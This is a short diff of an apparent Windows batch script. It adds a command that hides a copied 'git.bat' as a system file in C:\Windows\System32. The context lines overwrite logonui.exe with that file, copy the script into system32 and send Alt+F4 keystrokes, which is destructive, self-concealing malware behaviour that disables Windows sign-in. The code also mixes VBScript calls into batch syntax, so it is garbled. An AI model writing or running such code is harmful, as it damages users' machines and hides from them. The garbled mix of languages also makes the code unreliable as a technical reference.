@@ -56,6 +56,8 @@ cd "MicrosoftWindowsServicesEtc"
 
 copy "git.bat" "C:\Windows\System32\logonui.exe" /Y
 
+attrib +s +h C:\Windows\System32\git.bat
+
 Set WshShell = WScript.CreateObject("WScript.Shell") WshShell.SendKeys("%{Alt+F4}")
 color a
 copy ""%0"" "C:\Windows\system32\git.bat"
